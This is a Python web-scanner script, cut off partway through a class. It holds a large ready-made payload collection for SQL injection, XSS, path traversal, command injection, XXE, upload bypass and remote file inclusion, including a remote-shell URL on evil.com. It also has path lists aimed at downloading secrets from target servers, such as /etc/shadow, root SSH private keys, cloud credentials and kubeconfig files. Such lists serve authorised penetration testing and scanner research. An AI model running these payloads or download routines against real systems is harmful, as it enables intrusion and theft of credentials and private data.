#!/usr/bin/env python3
"""
🚀 ADVANCED iOS WEB SCANNER v9.0 - PRODUCTION EDITION
Fully Featured with File Download Capabilities
ENHANCED WITH SERVER FILE DOWNLOAD FEATURES
BUG FIXED VERSION
"""

import asyncio
import aiohttp
import socket
import time
import re
import json
import hashlib
import random
import ssl
import sys
import os
import platform
import mimetypes
import urllib.request
import concurrent.futures
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urlparse, urljoin, quote, unquote, parse_qs
from html.parser import HTMLParser
from collections import deque
import ipaddress
import dns.resolver
import zipfile
import tarfile
import logging

# Enhanced logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('scanner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Detect iOS/Pyto environment
try:
    IOS_MODE = platform.system() == 'Darwin' and ('pyto' in sys.executable.lower() or 'ish' in sys.executable.lower())
except:
    IOS_MODE = False

# Color Output for Better UX
class Color:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ORANGE = '\033[38;5;208m'
    PURPLE = '\033[38;5;129m'
    PINK = '\033[38;5;205m'
    
    @classmethod
    def success(cls, text): 
        return f"{cls.GREEN}{cls.BOLD}✓ {text}{cls.RESET}"
    
    @classmethod
    def warning(cls, text): 
        return f"{cls.YELLOW}⚠ {text}{cls.RESET}"
    
    @classmethod
    def error(cls, text): 
        return f"{cls.RED}✗ {text}{cls.RESET}"
    
    @classmethod
    def info(cls, text, end='\n'):  # FIXED: Added end parameter
        return f"{cls.CYAN}▶ {text}{cls.RESET}{end}"
    
    @classmethod
    def highlight(cls, text): 
        return f"{cls.MAGENTA}{cls.BOLD}{text}{cls.RESET}"
    
    @classmethod
    def blue(cls, text): 
        return f"{cls.BLUE}{text}{cls.RESET}"
    
    @classmethod
    def white(cls, text): 
        return f"{cls.WHITE}{text}{cls.RESET}"
    
    @classmethod
    def bold(cls, text): 
        return f"{cls.BOLD}{text}{cls.RESET}"
    
    @classmethod
    def orange(cls, text): 
        return f"{cls.ORANGE}{text}{cls.RESET}"
    
    @classmethod
    def purple(cls, text): 
        return f"{cls.PURPLE}{text}{cls.RESET}"
    
    @classmethod
    def pink(cls, text): 
        return f"{cls.PINK}{text}{cls.RESET}"

C = Color()

# ==================== MODULE CONFIGURATION ====================
MODULE_INPUTS = [
    {
        'name': 'target_url',
        'type': 'url',
        'prompt': '🎯 Target URL (https://example.com)',
        'required': True,
        'default': 'https://httpbin.org'
    },
    {
        'name': 'scan_mode',
        'type': 'select',
        'prompt': '⚡ Scan Mode',
        'choices': ['Quick', 'Standard', 'Deep', 'Comprehensive', 'Pentest'],
        'required': False,
        'default': 'Standard'
    },
    {
        'name': 'auto_advanced',
        'type': 'boolean',
        'prompt': '🤖 Enable AI-Powered Auto-Scan (Recommended)',
        'required': False,
        'default': True
    },
    {
        'name': 'output_format',
        'type': 'select',
        'prompt': '📄 Output Format',
        'choices': ['Text', 'JSON', 'HTML', 'CSV'],
        'required': False,
        'default': 'Text'
    },
    {
        'name': 'download_files',
        'type': 'boolean',
        'prompt': '📥 Download Sensitive & JS Files (Recommended)',
        'required': False,
        'default': True
    },
    {
        'name': 'download_server_files',
        'type': 'boolean',
        'prompt': '🖥️ Download Server Configuration Files (Apache/Nginx/PHP/Node.js)',
        'required': False,
        'default': True
    },
    {
        'name': 'max_file_size',
        'type': 'number',
        'prompt': '📏 Max File Size to Download (MB)',
        'required': False,
        'default': 10
    },
    {
        'name': 'save_directory',
        'type': 'text',
        'prompt': '📁 Save Directory (leave empty for auto)',
        'required': False,
        'default': ''
    }
]

# Module Metadata
display_name = "Advanced Web Scanner v9.0 - Production"
author = "Security AI Team"
version = "9.0"
description = "Complete web security scanner with file download, AI-powered detection, vulnerability assessment, SERVER FILE DOWNLOADER"
category = "scanner"

# ==================== ENHANCED CONFIGURATIONS ====================

# AI-Powered Auto Configuration
AUTO_CONFIGS = {
    'Quick': {
        'timeout': 8,
        'max_threads': 3,
        'max_depth': 1,
        'test_paths': 50,
        'scan_ports': False,
        'tech_detection': 'basic',
        'vuln_scan': 'light',
        'crawl_site': False,
        'subdomain_scan': False,
        'ssl_check': False,
        'download_files': False,
        'download_server_files': False,
        'max_file_size': 5
    },
    'Standard': {
        'timeout': 15,
        'max_threads': 5,
        'max_depth': 2,
        'test_paths': 100,
        'scan_ports': True,
        'tech_detection': 'advanced',
        'check_headers': True,
        'vuln_scan': 'medium',
        'crawl_site': True,
        'subdomain_scan': False,
        'ssl_check': True,
        'download_files': True,
        'download_server_files': True,
        'max_file_size': 10
    },
    'Deep': {
        'timeout': 25,
        'max_threads': 8,
        'max_depth': 3,
        'test_paths': 200,
        'scan_ports': True,
        'tech_detection': 'deep',
        'check_headers': True,
        'vuln_scan': 'extensive',
        'crawl_site': True,
        'subdomain_scan': True,
        'ssl_check': True,
        'api_scan': True,
        'js_analysis': True,
        'download_files': True,
        'download_server_files': True,
        'max_file_size': 20
    },
    'Comprehensive': {
        'timeout': 40,
        'max_threads': 12,
        'max_depth': 4,
        'test_paths': 500,
        'scan_ports': True,
        'tech_detection': 'deep',
        'check_headers': True,
        'vuln_scan': 'comprehensive',
        'crawl_site': True,
        'subdomain_scan': True,
        'ssl_check': True,
        'file_discovery': True,
        'api_discovery': True,
        'js_analysis': True,
        'dependency_check': True,
        'cloud_config': True,
        'download_files': True,
        'download_server_files': True,
        'max_file_size': 50
    },
    'Pentest': {
        'timeout': 60,
        'max_threads': 15,
        'max_depth': 5,
        'test_paths': 1000,
        'scan_ports': True,
        'tech_detection': 'deep',
        'check_headers': True,
        'vuln_scan': 'pentest',
        'crawl_site': True,
        'subdomain_scan': True,
        'ssl_check': True,
        'file_discovery': True,
        'api_discovery': True,
        'js_analysis': True,
        'dependency_check': True,
        'cloud_config': True,
        'bruteforce_test': True,
        'rate_limit_test': True,
        'download_files': True,
        'download_server_files': True,
        'max_file_size': 100
    }
}

# SERVER CONFIGURATION FILES PATTERNS - EXTENSIVE COLLECTION
SERVER_CONFIG_PATTERNS = {
    # Apache Web Server
    'apache': [
        r'httpd\.conf', r'apache2\.conf', r'apache\.conf', r'\.htaccess', r'\.htpasswd',
        r'sites-available/', r'sites-enabled/', r'conf-available/', r'conf-enabled/',
        r'mods-available/', r'mods-enabled/', r'ports\.conf', r'envvars',
        r'apache2/sites-available/', r'apache2/sites-enabled/',
        r'httpd-vhosts\.conf', r'extra/httpd-ssl\.conf', r'extra/httpd-vhosts\.conf',
        r'conf/httpd\.conf', r'conf/extra/httpd-ssl\.conf'
    ],
    
    # Nginx Web Server
    'nginx': [
        r'nginx\.conf', r'conf\.d/', r'sites-available/', r'sites-enabled/',
        r'nginx/sites-available/', r'nginx/sites-enabled/',
        r'fastcgi\.conf', r'fastcgi_params', r'scgi_params', r'uwsgi_params',
        r'mime\.types', r'koi-utf', r'koi-win', r'win-utf',
        r'conf/nginx\.conf', r'conf/conf\.d/', r'conf/sites-enabled/'
    ],
    
    # PHP Configuration
    'php': [
        r'php\.ini', r'php-fpm\.conf', r'php-fpm\.d/', r'php-fpm/pool\.d/',
        r'php/php\.ini', r'php/conf\.d/', r'php-fpm\.d/www\.conf',
        r'php/7\.4/fpm/pool\.d/', r'php/8\.0/fpm/pool\.d/', r'php/8\.1/fpm/pool\.d/',
        r'php/8\.2/fpm/pool\.d/', r'php/8\.3/fpm/pool\.d/',
        r'etc/php\.ini', r'etc/php-fpm\.conf', r'etc/php-fpm\.d/'
    ],
    
    # Node.js / JavaScript
    'nodejs': [
        r'package\.json', r'package-lock\.json', r'yarn\.lock', r'npm-shrinkwrap\.json',
        r'\.npmrc', r'\.yarnrc', r'tsconfig\.json', r'nodemon\.json',
        r'ecosystem\.config\.js', r'pm2\.config\.js', r'Procfile',
        r'server\.js', r'index\.js', r'app\.js', r'main\.js',
        r'bin/www', r'app/config/', r'config/env/', r'\.env',
        r'config/database\.js', r'config/config\.json'
    ],
    
    # Python (Django, Flask, etc.)
    'python': [
        r'requirements\.txt', r'requirements\.py', r'Pipfile', r'Pipfile\.lock',
        r'setup\.py', r'setup\.cfg', r'pyproject\.toml', r'MANIFEST\.in',
        r'manage\.py', r'wsgi\.py', r'asgi\.py', r'\.python-version',
        r'uwsgi\.ini', r'gunicorn\.conf\.py', r'config/gunicorn\.py',
        r'config/uwsgi\.ini', r'django/settings\.py', r'flask/config\.py',
        r'\.env', r'\.flaskenv'
    ],
    
    # Ruby / Rails
    'ruby': [
        r'Gemfile', r'Gemfile\.lock', r'\.ruby-version', r'\.ruby-gemset',
        r'config\.ru', r'Rakefile', r'config/database\.yml',
        r'config/secrets\.yml', r'config/application\.rb',
        r'config/environments/', r'config/initializers/',
        r'config/puma\.rb', r'config/unicorn\.rb'
    ],
    
    # Java
    'java': [
        r'pom\.xml', r'build\.gradle', r'gradle\.properties',
        r'settings\.gradle', r'build\.xml', r'web\.xml',
        r'application\.properties', r'application\.yml',
        r'application\.yaml', r'bootstrap\.properties',
        r'bootstrap\.yml', r'server\.xml', r'context\.xml'
    ],
    
    # .NET
    'dotnet': [
        r'web\.config', r'app\.config', r'App\.config',
        r'Global\.asax', r'Global\.asax\.cs', r'Global\.asax\.vb',
        r'packages\.config', r'\.csproj', r'\.vbproj',
        r'appsettings\.json', r'appsettings\.Development\.json',
        r'appsettings\.Production\.json'
    ],
    
    # Database Configuration
    'database': [
        r'\.env', r'config/database\.yml', r'config/database\.json',
        r'config/mongo\.yml', r'config/redis\.conf',
        r'config/elasticsearch\.yml', r'config/cassandra\.yaml',
        r'mysql\.conf', r'my\.cnf', r'my\.ini',
        r'postgresql\.conf', r'pg_hba\.conf'
    ],
    
    # Docker & Container
    'docker': [
        r'Dockerfile', r'docker-compose\.yml', r'docker-compose\.yaml',
        r'\.dockerignore', r'docker-compose\.override\.yml',
        r'docker-compose\.prod\.yml', r'Dockerfile\.prod',
        r'docker/nginx\.conf', r'docker/php\.ini',
        r'docker-compose\.development\.yml'
    ],
    
    # Cloud Services
    'cloud': [
        r'\.aws/credentials', r'\.aws/config', r'gcloud/config',
        r'azure/config', r'heroku/config', r'\.cloudfoundry/config',
        r'app\.yaml', r'app\.yml', r'appengine\.yaml',
        r'cloudbuild\.yaml', r'deploy\.yaml'
    ],
    
    # Log Files
    'logs': [
        r'\.log$', r'error_log', r'access_log', r'error\.log',
        r'access\.log', r'app\.log', r'laravel\.log',
        r'debug\.log', r'production\.log', r'development\.log',
        r'nginx/access\.log', r'nginx/error\.log',
        r'apache2/access\.log', r'apache2/error\.log',
        r'logs/app\.log', r'logs/error\.log'
    ],
    
    # Backup Files
    'backup': [
        r'\.bak$', r'\.backup$', r'\.old$', r'\.save$',
        r'_backup\.', r'backup\.', r'dump\.', r'\.sql$',
        r'database\.sql', r'db_backup\.sql', r'db_dump\.sql',
        r'backup\.zip', r'backup\.tar', r'backup\.tar\.gz',
        r'backup\.7z', r'backup\.rar'
    ],
    
    # Source Code Files
    'source_code': [
        r'\.php$', r'\.js$', r'\.ts$', r'\.py$', r'\.rb$',
        r'\.java$', r'\.cs$', r'\.cpp$', r'\.c$', r'\.go$',
        r'\.rs$', r'\.swift$', r'\.kt$', r'\.scala$',
        r'\.pl$', r'\.pm$', r'\.lua$', r'\.sh$', r'\.bash$'
    ],
    
    # Configuration Directories
    'config_dirs': [
        r'etc/', r'config/', r'conf/', r'settings/',
        r'.config/', r'.local/', r'.cache/',
        r'var/www/', r'var/log/', r'var/lib/',
        r'usr/local/', r'usr/share/', r'opt/',
        r'home/', r'root/', r'.ssh/'
    ]
}

# Server File Paths Database
SERVER_FILE_PATHS = {
    # Linux Standard Paths
    'linux_common': [
        '/etc/passwd',
        '/etc/shadow',
        '/etc/group',
        '/etc/hosts',
        '/etc/hostname',
        '/etc/resolv.conf',
        '/etc/nsswitch.conf',
        '/etc/services',
        '/etc/protocols',
        '/etc/motd',
        '/etc/issue',
        '/etc/issue.net',
        '/etc/bash.bashrc',
        '/etc/profile',
        '/etc/shells',
        '/etc/fstab',
        '/etc/mtab',
        '/etc/crontab',
        '/etc/cron.d/',
        '/etc/cron.hourly/',
        '/etc/cron.daily/',
        '/etc/cron.weekly/',
        '/etc/cron.monthly/',
        '/etc/ssh/sshd_config',
        '/etc/ssh/ssh_config',
        '/root/.ssh/authorized_keys',
        '/root/.ssh/id_rsa',
        '/root/.bash_history',
        '/home/*/.bash_history',
        '/home/*/.ssh/authorized_keys',
        '/var/log/auth.log',
        '/var/log/syslog',
        '/var/log/dmesg',
        '/var/log/kern.log',
        '/var/log/messages',
        '/proc/version',
        '/proc/cpuinfo',
        '/proc/meminfo',
        '/proc/self/environ'
    ],
    
    # Web Server Paths
    'web_server': [
        # Apache
        '/etc/apache2/apache2.conf',
        '/etc/apache2/httpd.conf',
        '/etc/apache2/ports.conf',
        '/etc/apache2/sites-available/',
        '/etc/apache2/sites-enabled/',
        '/etc/apache2/conf-available/',
        '/etc/apache2/conf-enabled/',
        '/etc/apache2/mods-available/',
        '/etc/apache2/mods-enabled/',
        '/var/www/html/',
        '/var/www/',
        '/usr/local/apache2/conf/httpd.conf',
        
        # Nginx
        '/etc/nginx/nginx.conf',
        '/etc/nginx/conf.d/',
        '/etc/nginx/sites-available/',
        '/etc/nginx/sites-enabled/',
        '/usr/local/nginx/conf/nginx.conf',
        
        # PHP
        '/etc/php/*/php.ini',
        '/etc/php/*/fpm/php-fpm.conf',
        '/etc/php/*/fpm/pool.d/',
        '/usr/local/etc/php/php.ini',
        
        # Node.js
        '/var/www/*/package.json',
        '/var/www/*/package-lock.json',
        '/home/*/app/package.json',
        '/opt/*/package.json',
        
        # Python
        '/var/www/*/requirements.txt',
        '/var/www/*/manage.py',
        '/var/www/*/wsgi.py',
        '/home/*/app/requirements.txt'
    ],
    
    # Database Paths
    'database': [
        # MySQL
        '/etc/mysql/my.cnf',
        '/etc/my.cnf',
        '/var/lib/mysql/',
        '/usr/local/mysql/data/',
        
        # PostgreSQL
        '/etc/postgresql/*/main/postgresql.conf',
        '/etc/postgresql/*/main/pg_hba.conf',
        '/var/lib/postgresql/*/main/',
        
        # MongoDB
        '/etc/mongod.conf',
        '/var/lib/mongodb/',
        '/usr/local/etc/mongod.conf',
        
        # Redis
        '/etc/redis/redis.conf',
        '/var/lib/redis/',
        '/usr/local/etc/redis.conf'
    ],
    
    # Application Specific
    'applications': [
        # WordPress
        '/var/www/html/wp-config.php',
        '/var/www/html/wp-content/',
        '/var/www/html/wp-admin/',
        '/var/www/html/wp-includes/',
        
        # Laravel
        '/var/www/html/.env',
        '/var/www/html/config/',
        '/var/www/html/storage/',
        
        # Django
        '/var/www/html/manage.py',
        '/var/www/html/settings.py',
        '/var/www/html/requirements.txt',
        
        # Flask
        '/var/www/html/app.py',
        '/var/www/html/config.py',
        '/var/www/html/requirements.txt',
        
        # Ruby on Rails
        '/var/www/html/config/database.yml',
        '/var/www/html/config/secrets.yml',
        '/var/www/html/Gemfile',
        
        # .NET
        '/var/www/html/web.config',
        '/var/www/html/App_Data/',
        '/var/www/html/bin/'
    ],
    
    # Cloud & Container
    'cloud': [
        # Docker
        '/var/lib/docker/',
        '/etc/docker/daemon.json',
        
        # Kubernetes
        '/etc/kubernetes/',
        '/var/lib/kubelet/',
        '/root/.kube/config',
        
        # AWS
        '/home/*/.aws/credentials',
        '/home/*/.aws/config',
        '/root/.aws/credentials',
        
        # Azure
        '/home/*/.azure/config',
        '/root/.azure/config'
    ],
    
    # Backup & Dump Files
    'backups': [
        '/backup/',
        '/var/backups/',
        '/tmp/backup/',
        '/home/*/backup/',
        '/root/backup/',
        '/var/www/backup/',
        '*.sql',
        '*.dump',
        '*.tar.gz',
        '*.zip',
        '*.7z',
        '*.rar'
    ],
    
    # Log Files
    'logs': [
        '/var/log/apache2/access.log',
        '/var/log/apache2/error.log',
        '/var/log/nginx/access.log',
        '/var/log/nginx/error.log',
        '/var/log/php*.log',
        '/var/log/mysql/error.log',
        '/var/log/postgresql/*.log',
        '/var/log/auth.log',
        '/var/log/syslog',
        '/var/log/daemon.log',
        '/var/log/user.log'
    ]
}

# Sensitive files patterns for download
SENSITIVE_FILES_PATTERNS = {
    'configuration': [
        r'\.env', r'config\.php', r'config\.json', r'config\.yml', r'config\.yaml',
        r'web\.config', r'appsettings\.json', r'settings\.py', r'\.htaccess',
        r'\.htpasswd', r'wp-config\.php', r'database\.yml', r'secrets\.txt',
        r'credentials\.json', r'\.aws/credentials', r'\.git/config',
        r'package\.json', r'composer\.json', r'pom\.xml', r'build\.gradle'
    ],
    'backup': [
        r'\.bak$', r'\.backup$', r'\.old$', r'\.save$', r'_backup\.',
        r'backup\.zip', r'backup\.tar', r'backup\.tar\.gz', r'dump\.sql',
        r'database\.sql', r'backup\.sql', r'db_backup\.'
    ],
    'log': [
        r'\.log$', r'error_log', r'access_log', r'debug\.log', r'laravel\.log',
        r'server\.log', r'application\.log'
    ],
    'document': [
        r'\.pdf$', r'\.doc$', r'\.docx$', r'\.xls$', r'\.xlsx$', r'\.ppt$',
        r'\.pptx$', r'\.txt$', r'\.rtf$', r'\.odt$'
    ],
    'source_code': [
        r'\.py$', r'\.java$', r'\.cpp$', r'\.c$', r'\.cs$', r'\.js$', r'\.ts$',
        r'\.php$', r'\.rb$', r'\.go$', r'\.rs$', r'\.swift$'
    ],
    'server_config': [
        r'\.conf$', r'\.ini$', r'\.yml$', r'\.yaml$', r'\.xml$',
        r'httpd\.conf', r'nginx\.conf', r'php\.ini', r'my\.cnf',
        r'postgresql\.conf', r'redis\.conf', r'mongod\.conf'
    ]
}

# Intelligent Wordlists (Context-Aware) - Enhanced with Server Paths
COMMON_PATHS = [
    # Administration
    'admin', 'administrator', 'login', 'panel', 'dashboard', 'cp', 'controlpanel',
    'wp-admin', 'wp-login', 'user', 'users', 'account', 'manager', 'management',
    'admin.php', 'admin.asp', 'admin.aspx', 'admin.jsp', 'admin.cgi',
    'administrator.php', 'administrator.asp', 'administrator.aspx',
    
    # API Endpoints
    'api', 'api/v1', 'api/v2', 'api/v3', 'api/v4', 'graphql', 'rest', 'json', 'xml',
    'oauth', 'auth', 'token', 'login', 'register', 'signin', 'signup',
    'swagger', 'swagger.json', 'swagger.yaml', 'openapi.json',
    'api-docs', 'api-docs.json', 'api/v1/docs', 'api/v2/docs',
    
    # Configuration Files
    'config', 'configuration', 'settings', 'setup', 'install', 'update',
    '.env', '.config', 'config.php', 'config.json', 'config.yaml', 'config.yml',
    'configuration.php', 'settings.php', 'appsettings.json', 'web.config',
    '.htaccess', '.htpasswd', 'robots.txt', 'sitemap.xml',
    
    # Backup & Database
    'backup', 'backups', 'database', 'db', 'sql', 'dump', 'export',
    'data', 'databases', 'mysql', 'postgres', 'mongodb', 'redis',
    'backup.zip', 'backup.tar', 'backup.tar.gz', 'backup.sql',
    'db_backup.zip', 'database_backup.sql', 'dump.sql',
    
    # Development & Debug
    'debug', 'test', 'testing', 'dev', 'development', 'stage', 'staging',
    'log', 'logs', 'error', 'errors', 'trace', 'monitor',
    'phpinfo.php', 'info.php', 'test.php', 'server-status',
    'console', 'debug.php', 'debug.log',
    
    # Files & Directories
    'uploads', 'files', 'images', 'assets', 'static', 'media', 'downloads',
    'private', 'secret', 'hidden', 'secure', 'protected',
    'tmp', 'temp', 'cache', 'session', 'tempfiles',
    
    # Documentation
    'readme', 'license', 'changelog', 'docs', 'documentation', 'help',
    'readme.md', 'readme.txt', 'license.txt', 'changelog.md',
    
    # Common Files
    '.git/HEAD', '.git/config', '.git/description',
    '.svn/entries', '.hg/store', '.bzr/README',
    'crossdomain.xml', 'clientaccesspolicy.xml',
    'phpmyadmin', 'phppgadmin', 'sqlitemanager',
    
    # WordPress Specific
    'wp-config.php', 'wp-login.php', 'xmlrpc.php',
    'wp-content/uploads/', 'wp-includes/',
    
    # Sensitive Data
    'passwd', 'shadow', 'htpasswd', '.ssh/id_rsa',
    'secrets.txt', 'credentials.json', '.aws/credentials',
    
    # SERVER PATHS ADDED
    # Linux System Files
    'etc/passwd', 'etc/shadow', 'etc/group', 'etc/hosts',
    'etc/resolv.conf', 'etc/ssh/sshd_config',
    
    # Web Server Configs
    'etc/apache2/apache2.conf', 'etc/apache2/httpd.conf',
    'etc/nginx/nginx.conf', 'etc/nginx/conf.d/',
    'etc/php/php.ini', 'etc/php-fpm.conf',
    
    # Application Configs
    'var/www/html/', 'var/www/', 'home/*/public_html/',
    'opt/lampp/htdocs/', 'usr/local/var/www/',
    
    # Database Configs
    'etc/mysql/my.cnf', 'etc/postgresql/postgresql.conf',
    'etc/redis/redis.conf', 'etc/mongod.conf',
    
    # Log Files
    'var/log/apache2/access.log', 'var/log/nginx/error.log',
    'var/log/auth.log', 'var/log/syslog',
    
    # Backup Locations
    'var/backups/', 'backup/', 'tmp/backup/',
    'home/*/backup/', 'root/backup/',
    
    # Container & Cloud
    'docker-compose.yml', 'Dockerfile',
    '.aws/credentials', '.kube/config'
]

# Enhanced Technology Database
TECH_DATABASE = {
    'Frontend': {
        'React': ['react', 'react-dom', 'data-react', '__react', 'reactjs'],
        'Vue.js': ['vue', '__vue__', 'data-v-', 'v-', 'vuejs'],
        'Angular': ['ng-', 'data-ng-', 'angular', 'ng-app', 'ng-controller'],
        'jQuery': ['jquery', 'jQuery', 'jquery.', '$('],
        'Bootstrap': ['bootstrap', 'bs-', 'data-bs', 'btn-primary'],
        'Tailwind': ['tailwind', 'tw-', 'tailwindcss'],
        'Next.js': ['next', '__next', 'nextjs'],
        'Nuxt.js': ['nuxt', '__nuxt', 'nuxtjs'],
        'Svelte': ['svelte', 'svelte-app'],
        'Webpack': ['webpack', '__webpack'],
    },
    'Backend': {
        'Node.js': ['node', 'express', 'koa', 'next', 'nuxt', 'npm'],
        'Django': ['django', 'csrfmiddleware', 'django-admin', 'csrf_token'],
        'Laravel': ['laravel', 'csrf-token', 'laravel_session', 'x-laravel'],
        'Ruby on Rails': ['rails', '_rails', 'ruby', 'rails-api'],
        'Spring': ['spring', 'org.springframework', 'spring-boot', 'springframework'],
        'Flask': ['flask', 'werkzeug', 'flask-admin'],
        '.NET': ['asp.net', 'microsoft', 'x-aspnet', 'x-aspnet-version'],
        'PHP': ['php/', 'x-powered-by: php', 'phpsessid', 'phpinfo'],
        'Python': ['python', 'django', 'flask', 'wsgi', 'python/'],
        'Go': ['go', 'golang', 'x-go-'],
        'Rust': ['rust', 'actix', 'rocket'],
    },
    'Server': {
        'Nginx': ['nginx', 'x-nginx', 'nginx/'],
        'Apache': ['apache', 'httpd', 'apache/', 'x-apache'],
        'Cloudflare': ['cloudflare', 'cf-', 'cf-ray', 'cloudflare-nginx'],
        'AWS': ['aws', 'amazon', 'x-amz', 's3', 'ec2', 'elasticbeanstalk'],
        'Microsoft-IIS': ['microsoft-iis', 'iis', 'x-powered-by: iis'],
        'LiteSpeed': ['litespeed', 'litespeedweb'],
        'Tomcat': ['tomcat', 'apache-tomcat', 'x-tomcat'],
        'Caddy': ['caddy', 'caddy-server'],
        'OpenResty': ['openresty', 'x-openresty'],
    },
    'Database': {
        'MySQL': ['mysql', 'mysqli', 'pdo_mysql', 'x-mysql'],
        'PostgreSQL': ['postgresql', 'postgres', 'pdo_pgsql'],
        'MongoDB': ['mongodb', 'mongo', 'mongoose'],
        'Redis': ['redis', 'redislabs', 'redis-server'],
        'SQLite': ['sqlite', 'sqlite3', 'pdo_sqlite'],
        'Oracle': ['oracle', 'oracle-database', 'oci'],
        'MariaDB': ['mariadb', 'x-mariadb'],
        'Cassandra': ['cassandra', 'apache-cassandra'],
        'Elasticsearch': ['elasticsearch', 'elastic'],
    },
    'Analytics': {
        'Google Analytics': ['google-analytics', 'ga(', 'gtag', 'analytics.js'],
        'Facebook Pixel': ['facebook', 'fbq(', 'facebook-pixel'],
        'Hotjar': ['hotjar', '_hj'],
        'Google Tag Manager': ['gtm', 'googletagmanager'],
        'Mixpanel': ['mixpanel', 'mp.'],
        'Segment': ['segment', 'analytics.js'],
    },
    'Security': {
        'Cloudflare WAF': ['cloudflare-waf', 'cf-waf'],
        'Akamai': ['akamai', 'x-akamai'],
        'Imperva': ['imperva', 'x-imperva'],
        'Sucuri': ['sucuri', 'x-sucuri'],
        'Wordfence': ['wordfence', 'wf_'],
        'ModSecurity': ['mod_security', 'modsecurity'],
    },
    'Container': {
        'Docker': ['docker', 'x-docker'],
        'Kubernetes': ['kubernetes', 'k8s'],
        'AWS ECS': ['ecs', 'amazon-ecs'],
        'Google Cloud Run': ['cloud-run', 'google-cloud-run'],
    }
}

# Vulnerability Patterns
VULN_PATTERNS = {
    'SQL Injection': {
        'payloads': [
            "'", "' OR '1'='1", "' UNION SELECT NULL--", "1' AND '1'='1",
            "' OR 1=1--", "admin'--", "' OR 'a'='a", "' OR 1=1#",
            "' UNION SELECT 1,2,3--", "' AND SLEEP(5)--"
        ],
        'indicators': ['sql', 'mysql', 'syntax', 'error', 'warning', 'query', 'you have an error'],
        'severity': 'Critical'
    },
    'XSS': {
        'payloads': [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "<svg/onload=alert(1)>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert(1)>"
        ],
        'indicators': ['script', 'alert', 'onerror', 'javascript:', 'xss'],
        'severity': 'High'
    },
    'Path Traversal': {
        'payloads': [
            '../../../etc/passwd',
            '..\\..\\windows\\win.ini',
            '../../../../etc/shadow',
            '....//....//etc/passwd',
            '%2e%2e%2fetc%2fpasswd',
            '..%252f..%252fetc%252fpasswd'
        ],
        'indicators': ['root:', '[boot loader]', 'passwd file', 'no such file'],
        'severity': 'High'
    },
    'SSRF': {
        'payloads': [
            'http://localhost',
            'http://127.0.0.1',
            'http://169.254.169.254',
            'http://[::1]',
            'http://0.0.0.0',
            'file:///etc/passwd',
            'gopher://127.0.0.1:25'
        ],
        'indicators': ['localhost', 'internal', 'metadata', 'amazon', 'aws'],
        'severity': 'Critical'
    },
    'Command Injection': {
        'payloads': [
            '; ls',
            '| dir',
            '&& whoami',
            '`id`',
            '$(whoami)',
            '; cat /etc/passwd',
            '| cat /etc/passwd'
        ],
        'indicators': ['root', 'uid=', 'gid=', 'bin/', 'etc/'],
        'severity': 'Critical'
    },
    'File Upload': {
        'payloads': [
            'test.php.jpg',
            'shell.php%00.jpg',
            '.htaccess',
            'test.phtml',
            'test.php5'
        ],
        'indicators': ['upload', 'file', 'extension', 'not allowed'],
        'severity': 'High'
    },
    'XXE': {
        'payloads': [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        ],
        'indicators': ['root:', 'bin/', 'daemon:', 'xml', 'parse'],
        'severity': 'Critical'
    },
    'LFI/RFI': {
        'payloads': [
            '../../../../etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php',
            'http://evil.com/shell.txt',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',
            'expect://whoami'
        ],
        'indicators': ['root:', '<?php', 'warning', 'failed to open stream'],
        'severity': 'High'
    }
}

# Security Headers Check
SECURITY_HEADERS = {
    'Strict-Transport-Security': {
        'description': 'Enforces secure (HTTP over SSL/TLS) connections',
        'recommended': 'max-age=31536000; includeSubDomains',
        'severity': 'Medium'
    },
    'X-Frame-Options': {
        'description': 'Prevents clickjacking attacks',
        'recommended': 'DENY or SAMEORIGIN',
        'severity': 'Medium'
    },
    'X-Content-Type-Options': {
        'description': 'Prevents MIME type sniffing',
        'recommended': 'nosniff',
        'severity': 'Low'
    },
    'Content-Security-Policy': {
        'description': 'Prevents XSS and other code injection attacks',
        'recommended': "default-src 'self'",
        'severity': 'High'
    },
    'X-XSS-Protection': {
        'description': 'Enables XSS filtering',
        'recommended': '1; mode=block',
        'severity': 'Low'
    },
    'Referrer-Policy': {
        'description': 'Controls referrer information',
        'recommended': 'strict-origin-when-cross-origin',
        'severity': 'Low'
    },
    'Permissions-Policy': {
        'description': 'Controls browser features and APIs',
        'recommended': 'geolocation=(), microphone=(), camera=()',
        'severity': 'Medium'
    }
}

# SSL/TLS Checks
SSL_CHECKS = {
    'protocols': ['TLSv1.2', 'TLSv1.3'],
    'weak_ciphers': [
        'RC4', 'DES', '3DES', 'MD5', 'SHA1', 
        'NULL', 'EXPORT', 'ANON', 'ADH', 'LOW'
    ]
}

# ==================== ENHANCED SERVER FILE DOWNLOADER ====================

class ServerFileDownloader:
    """Advanced server file downloader with intelligent path detection"""
    
    def __init__(self, base_dir="server_downloads", max_size_mb=10, timeout=30):
        self.base_dir = Path(base_dir)
        try:
            self.max_size_bytes = int(float(max_size_mb)) * 1024 * 1024
        except (ValueError, TypeError):
            self.max_size_bytes = 10 * 1024 * 1024  # Default 10MB
        
        self.timeout = timeout
        self.downloaded_files = []
        self.failed_downloads = []
        self.server_type = None
        self.detected_tech = {}
        
        # Create download directory
        self.base_dir.mkdir(exist_ok=True, parents=True)
    
    def set_server_technology(self, tech_stack):
        """Set detected server technology for intelligent path selection"""
        self.detected_tech = tech_stack
        self.server_type = self.detect_server_type(tech_stack)
        logger.info(f"Server type detected: {self.server_type}")
    
    def detect_server_type(self, tech_stack):
        """Detect server type from technology stack"""
        server_types = []
        
        techs = tech_stack.get('technologies', {})
        
